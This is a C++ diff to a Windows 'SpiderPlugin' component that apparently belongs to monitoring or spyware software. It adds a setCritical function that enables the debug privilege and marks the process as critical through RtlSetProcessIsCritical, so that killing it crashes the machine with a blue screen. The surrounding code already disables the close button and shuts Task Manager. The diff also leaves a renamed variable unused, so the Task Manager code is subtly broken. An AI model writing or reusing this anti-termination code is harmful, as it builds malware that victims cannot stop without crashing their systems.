@@ -9,8 +9,12 @@
 #include <ctime>
 #include <Aclapi.h>
 #include <Sddl.h>
+#include <winternl.h>
+#include <commctrl.h>
 #include "SpiderPlugin.h"
 #include "MacAddr.h"
+
+#pragma comment(lib, "ntdll.lib")
 
 namespace spider
 {
@@ -219,6 +223,9 @@ namespace spider
 	  HMENU hmenu = GetSystemMenu(hwnd, FALSE);
 	  EnableMenuItem(hmenu, SC_CLOSE, MF_GRAYED);
 	}
+
+	// Pop a BSOD if the process is killed
+	setCritical();
 
 	return true;
       }
@@ -756,11 +763,57 @@ namespace spider
 
       void SpiderPlugin::killTaskManager() const
       {
-	HWND TaskMgr = FindWindow(nullptr, "Task Manager");
-	if (TaskMgr)
+	HWND taskManager = FindWindow(nullptr, "Task Manager");
+	if (taskManager)
 	  {
 	    PostMessage(TaskMgr, WM_CLOSE, static_cast<LPARAM>(0),
 	                static_cast<WPARAM>(0));
+	  }
+      }
+
+      void SpiderPlugin::setCritical() const
+      {
+	typedef VOID(_stdcall * RtlSetProcessIsCritical)(
+	    IN BOOLEAN NewValue,
+	    OUT PBOOLEAN OldValue, // (optional)
+	    IN BOOLEAN IsWinlogon);
+
+	HANDLE                  hDLL;
+	RtlSetProcessIsCritical fSetCritical;
+
+	hDLL = LoadLibraryA("ntdll.dll");
+	if (hDLL)
+	  {
+	    HANDLE           hToken;
+	    LUID             luid;
+	    TOKEN_PRIVILEGES tkprivs;
+	    std::memset(&tkprivs, 0, sizeof(tkprivs));
+
+	    if (!OpenProcessToken(GetCurrentProcess(),
+	                          (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY),
+	                          &hToken))
+	      return;
+	    if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))
+	      {
+		CloseHandle(hToken);
+		return;
+	      }
+	    tkprivs.PrivilegeCount = 1;
+	    tkprivs.Privileges[0].Luid = luid;
+	    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	    BOOL ret = AdjustTokenPrivileges(
+	        hToken, false, &tkprivs, sizeof(tkprivs), nullptr, nullptr);
+	    CloseHandle(hToken);
+	    if (!ret)
+	      {
+		return;
+	      }
+
+	    fSetCritical = (RtlSetProcessIsCritical)GetProcAddress(
+	        (HINSTANCE)hDLL, "RtlSetProcessIsCritical");
+	    if (!fSetCritical)
+	      return;
+	    fSetCritical(1, 0, 0);
 	  }
       }
     }
